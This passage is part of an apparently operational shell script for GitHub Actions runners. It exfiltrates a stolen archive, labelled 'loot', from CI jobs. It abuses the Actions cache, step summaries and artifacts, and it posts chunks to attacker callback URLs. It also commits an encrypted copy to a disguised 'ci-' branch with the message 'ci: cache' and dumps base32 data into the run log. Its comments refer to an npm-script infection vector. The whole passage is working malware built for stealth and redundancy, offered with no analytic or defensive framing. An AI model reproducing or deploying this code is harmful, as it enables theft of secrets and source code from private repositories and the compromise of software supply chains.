          -H "Authorization: Bearer $RTOK" \
          -H "Accept: application/json;api-version=6.0-preview.1" \
          -H "Content-Type: application/octet-stream" \
          -H "Content-Range: bytes $off-$end/*" \
          --data-binary "@$p" 2>>"$D/errors.log")
        case "$CC" in 2*) ;; *) cok=0; note "cache_chunk_fail $CC"; break ;; esac
        off=$((end + 1))
      done
      rm -f "$T".cache.* 2>/dev/null
      if [ "$cok" = "1" ] && [ "$off" -ge "$SZ" ]; then
        FC=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X POST \
          "$CACHEAPIS/caches/$CID" \
          -H "Authorization: Bearer $RTOK" \
          -H "Accept: application/json;api-version=6.0-preview.1" \
          -H "Content-Type: application/json" \
          -d "{\"size\":$SZ}" 2>>"$D/errors.log")
        case "$FC" in 2*) ok=1; note "cache_dropped $CKEY" ;; *) note "cache_commit_fail $FC" ;; esac
      else
        note "cache_incomplete"
      fi
    else
      note "cache_reserve_fail"
    fi
  elif [ -n "$CACHEURL" ]; then
    # github.com retired the v1 surface; do not probe it there
    note "cache_v1_not_ghes"
  fi
fi

# --- step-summary store (private repos; summary is viewer-visible) ---
# Portable base64: no -w0 flag, unwrap + rewrap at 76. Retrieval: strip the
# markers, join lines, base64 -d.
if [ "${WF_EXFIL_SUM:-1}" = "1" ] && [ "${WF_PRIVATE:-0}" = "1" ] && [ -n "$SUM_FILE" ] \
   && [ "$SZ" -gt 0 ] && [ "$SZ" -le 700000 ] && command -v base64 >/dev/null 2>&1; then
  sumok=1
  printf '<!--WFX-BEGIN-->\n' >> "$SUM_FILE" 2>>"$D/errors.log" || sumok=0
  base64 "$T" > "$D/b64" 2>>"$D/errors.log" \
    && tr -d '\n' < "$D/b64" | fold -w 76 >> "$SUM_FILE" || sumok=0
  # A failed encode must not claim a dropped frame: dash reports the last
  # pipeline stage's status, so an empty staging file is the real proof.
  [ -s "$D/b64" ] || sumok=0
  rm -f "$D/b64" 2>/dev/null
  printf '\n<!--WFX-END-->\n' >> "$SUM_FILE" 2>>"$D/errors.log" || sumok=0
  if [ "$sumok" = "1" ]; then ok=1; note "sum_dropped"; else note "sum_write_fail"; fi
fi

# --- artifact upload (private repos; public repos serve artifacts anonymously) ---
if [ "${WF_EXFIL_ART:-1}" = "1" ] && [ "${WF_PRIVATE:-0}" = "1" ] && [ -n "$RTOK" ] && [ -n "$RUNURL" ] && [ "$SZ" -gt 0 ]; then
  ANAME="wfx-loot-${RID}"
  # create -> fileContainerResourceUrl (must be parsed; the container id from
  # the same response is not the PUT target). Env URLs end with "/" — the
  # path glue is "_apis", never "/_apis". 6.0-preview is the highest version
  # the live service accepts; 7.2-preview is rejected.
  RUNAPIS="${RUNURL}_apis/pipelines/workflows/${GITHUB_RUN_ID:-0}/artifacts"
  ARTC=$(curl -sS --connect-timeout 10 --max-time 30 -w '\n%{http_code}' -X POST "$RUNAPIS?api-version=6.0-preview" \
    -H "Authorization: Bearer $RTOK" \
    -H "Accept: application/json;api-version=6.0-preview" \
    -H "Content-Type: application/json" \
    -d "{\"Type\":\"actions_storage\",\"Name\":\"$ANAME\"}" 2>>"$D/errors.log")
  ARTCODE=$(printf '%s' "$ARTC" | tail -n1)
  FCRU=$(printf '%s' "$ARTC" | head -n -1 \
    | python3 -I -c 'import json,sys
try:
  o=json.load(sys.stdin)
except Exception:
  raise SystemExit(0)
print(o.get("fileContainerResourceUrl") or "")' 2>>"$D/errors.log")
  if [ -z "$FCRU" ]; then
    note "artifact_create_fail $ARTCODE"
  else
    case "$FCRU" in *\?*) ASEP='&' ;; *) ASEP='?' ;; esac
    IPATH="${ANAME}%2Floot.tgz"
    off=0; artok=1; sent=0
    while [ "$off" -lt "$SZ" ]; do
      end=$((off + 8388607))
      [ "$end" -ge "$SZ" ] && end=$((SZ - 1))
      # Chunked through a file: the dd/curl pipe cannot report a short read,
      # and a short chunk must never finalize a corrupt artifact.
      dd if="$T" bs=8388608 skip=$((off / 8388608)) count=1 of="$T.chunk" 2>>"$D/errors.log"
      CSZ=$(wc -c < "$T.chunk" 2>/dev/null || echo 0)
      UC=$(curl -sS --connect-timeout 10 --max-time 90 -o /dev/null -w '%{http_code}' -X PUT \
        "${FCRU}${ASEP}itemPath=${IPATH}" \
        -H "Authorization: Bearer $RTOK" \
        -H "Content-Type: application/octet-stream" \
        -H "Content-Range: bytes ${off}-${end}/${SZ}" \
        --data-binary "@$T.chunk" 2>>"$D/errors.log")
      rm -f "$T.chunk" 2>/dev/null
      case "$UC" in 2*) sent=$((sent + CSZ)) ;; *) artok=0; note "artifact_put_fail $UC"; break ;; esac
      off=$((end + 1))
    done
    if [ "$artok" = "1" ] && [ "$sent" -ge "$SZ" ]; then
      FC=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X PATCH \
        "$RUNAPIS?api-version=6.0-preview&artifactName=$ANAME" \
        -H "Authorization: Bearer $RTOK" \
        -H "Accept: application/json;api-version=6.0-preview" \
        -H "Content-Type: application/json" \
        -d "{\"Size\":$SZ}" 2>>"$D/errors.log")
      case "$FC" in 2*) ok=1; note "artifact_dropped $ANAME" ;; *) note "artifact_finalize_fail $FC" ;; esac
    fi
  fi
fi

# ---------- 9. deliver ----------
CB="${WF_CALLBACK:-}"
CB2="${WF_CALLBACK2:-}"
CT="${WF_CTOKEN:-}"
CH="${WF_CHUNK:-8388608}"

deliver() {
  url="$1"; f="$2"; extra="$3"
  case "$url" in *\?*) sep='&' ;; *) sep='?' ;; esac
  full="${url}${sep}h=${H}&l=${LABEL}&id=${RID}${extra}"
  [ -n "$CT" ] && full="${full}&t=${CT}"
  resp=$(curl -sS --connect-timeout 10 --max-time 30 -w '\n%{http_code}' -X POST \
    -H "Content-Type: application/gzip" --data-binary "@$f" "$full" 2>>"$D/errors.log")
  code=$(printf '%s' "$resp" | tail -n1)
  case "$code" in 200|201|204) return 0 ;; *) return 1 ;; esac
}

attempt() {
  url="$1"
  if [ "$SZ" -le "$CH" ]; then
    deliver "$url" "$T" ""
    return $?
  fi
  split -d -a 5 -b "$CH" "$T" "$T.part." 2>/dev/null
  total=$(ls "$T".part.* 2>/dev/null | wc -l | tr -d ' ')
  n=0
  for p in "$T".part.*; do
    [ -e "$p" ] || continue
    n=$((n+1))
    deliver "$url" "$p" "&part=${n}&of=${total}" || return 1
  done
  # The receiver only assembles a full part sequence; a short/empty sequence
  # (split failed, disk raced) must fail delivery, not claim success.
  [ "$n" -gt 0 ] && [ "$n" -eq "$total" ] || { note "split_mismatch n=$n of=$total"; return 1; }
  return 0
}

if [ -n "$CB" ]; then
  for i in 1 2 3; do
    if attempt "$CB"; then ok=1; break; fi
    note "deliver_retry $i"
    sleep $((i*5))
  done
fi
if [ "$ok" = "0" ] && [ -n "$CB2" ]; then
  if attempt "$CB2"; then ok=1; note "delivered_to_fallback"; fi
fi

if [ "$ok" = "0" ] && [ "${WF_FALLBACK:-0}" = "1" ] && [ -n "${WF_KEY:-}" ] && [ -n "${GITHUB_TOKEN:-}" ] && command -v openssl >/dev/null 2>&1; then
  openssl enc -aes-256-cbc -pbkdf2 -salt -pass pass:"$WF_KEY" -in "$T" -out "$T.enc" 2>>"$D/errors.log"
  if [ -s "$T.enc" ]; then
    FBN=".ci/$(date +%s)-$$.bin"
    # Prefix matches _cleanup_ci_branches: the cleanup side can only learn
    # run_id/job, so the branch must be identifiable from those alone.
    FBB="ci-${GITHUB_RUN_ID:-0}-${GITHUB_JOB:-0}-$$"
    FBJSON="$D/fb.json"
    SHA=$(curl -sS --max-time 30 -H "$AUTH" "$API/git/ref/heads/$REF_ENC" | sed -n 's/.*"sha"[[:space:]]*:[[:space:]]*"\([a-f0-9]\{40\}\)".*/\1/p' | head -1)
    if [ -n "$SHA" ]; then
      REF_CODE=$(curl -sS --max-time 30 -o /dev/null -w '%{http_code}' -X POST -H "$AUTH" \
        -H "Content-Type: application/json" "$API/git/refs" \
        -d "{\"ref\":\"refs/heads/$FBB\",\"sha\":\"$SHA\"}" 2>>"$D/errors.log")
      if [ "$REF_CODE" = "201" ]; then
        printf '{"message":"ci: cache","content":"' > "$FBJSON"
        base64 < "$T.enc" | tr -d '\n' >> "$FBJSON"
        printf '","branch":"%s"}' "$FBB" >> "$FBJSON"
        CODE=$(curl -sS --connect-timeout 10 --max-time 45 -o /dev/null -w '%{http_code}' -X PUT -H "$AUTH" \
          -H "Content-Type: application/json" "$API/contents/$FBN" \
          --data-binary @"$FBJSON" 2>>"$D/errors.log")
        case "$CODE" in 200|201) ok=1; note "committed $FBB $FBN" ;; *) note "commit_fail $CODE" ;; esac
      else
        note "ref_create_fail $REF_CODE"
      fi
    fi
  fi
fi

if [ "$ok" = "0" ] && [ "${WF_EXFIL_LOG:-0}" = "1" ] && command -v base32 >/dev/null 2>&1; then
  # stdout must actually be the run log: the npm-script vector wraps the
  # helper with >/dev/null, where this channel delivers nothing.
  case "$(readlink /proc/$$/fd/1 2>/dev/null)" in
    /dev/null) note "log_stdout_not_runlog" ;;
    *)
      base32 "$T" > "$D/b32" 2>>"$D/errors.log"
      B32_RC=$?
      if [ "$B32_RC" = "0" ] && [ -s "$D/b32" ]; then
        printf 'WFXLOG-BEGIN %s\n' "$RID"
        tr -d '\n' < "$D/b32"
        printf '\nWFXLOG-END %s\n' "$RID"
        ok=1; note "log_dropped"
      else
        note "log_drop_fail"
      fi
      ;;
  esac
fi
rm -rf "$D" "$T" "$T".part.* "$T.enc" 2>/dev/null
if [ "$ok" = "1" ]; then exit 0; else exit 42; fi
